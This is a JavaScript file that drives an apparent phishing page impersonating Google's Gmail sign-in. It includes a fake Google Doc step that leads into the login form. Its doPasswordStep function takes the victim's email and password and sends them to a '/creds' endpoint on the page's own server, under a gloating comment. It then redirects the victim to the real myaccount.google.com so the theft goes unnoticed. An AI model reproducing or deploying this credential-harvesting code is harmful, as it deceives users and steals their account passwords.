/* a regex express to valid email addresses */
/* ref. https://stackoverflow.com/questions/46155/how-to-validate-an-email-address-in-javascript */
function validateEmail(email) {
	var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
	return re.test(email);
}


function onReady(){
	scrollTo(400, 0)
}

function doEmailStep(){

	var emailValid = validateEmail($('#email-input').val());

	$('#cgle-progress-bar').fadeIn( 500 );//.css('display', 'block')
	$('#login-form').css('opacity', 0.5)

	setTimeout(() => {
		$('#cgle-progress-bar').fadeOut( 500 );//.css('display', 'none')
		$('#login-form').css('opacity', 1.0)
		if(emailValid){
			$('#email-input').removeClass('g-input-invalid');
			$('.invalid-email').css('display', 'none');
			$('#prev-email').text($('#email-input').val());
			toPasswordPage();
		} else {
			$('#email-input').addClass('g-input-invalid');
			$('.invalid-email').css('display', 'block');
			toEmailPage();
		}
	}, 400);
}

function doPasswordStep(){
	var username = $('#email-input').val()
	var password = $('#password-input').val()

	//Ladies and gentlemen, we got em
	console.log(username, password)
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open("GET", "/creds?username="+ username +"&password="+ password, false);
	xmlHttp.send(null);

	//Redirect to myaccount.google
	window.location.replace("https://myaccount.google.com")
}

function toEmailPage(){
	scrollTo(400)
	$('#instruction-text').text('Sign in')
	$('#instrution-text-desc').text('Continue to Gmail')
	$('#email-input').focus()
}

function toPasswordPage(){
	scrollTo(0)

	$('#instruction-text').text('Welcome')
	$('#instrution-text-desc').text(' ')
	$('#password-input').focus()
}

function scrollTo(toPerc, duration = 500){
	$('.slide-container-outer').animate({
		scrollLeft: toPerc + '%'
	 }, duration);
}


function attachEvents(){
	$('#email-form-step').on('submit', function( e ){
		doEmailStep()
		e.preventDefault()
	})


	$('.btn-next-email').on('click', function(){
		doEmailStep()
	})

	$('#password-form-step').on('submit', function( e ){
		doPasswordStep()
		e.preventDefault()
	})

	$('.btn-next-password').on('click', function(){
		doPasswordStep()
	})	
	$('.submit__g_doc').on("click", function(){
		let valid = true;
		$('#google__doc [required]').each(function() {
		  if ( $(this).is(':invalid') || !$(this).val() ) valid = false;
		})
		if (!valid) alert("error please fill required fields!");
		else {
			$('#login-app').removeClass('non_visible');
			$('.google__doc').css('display', 'none');
			toEmailPage()
		} 
	})

}


window.onload = function(){
	onReady()
	attachEvents()
}


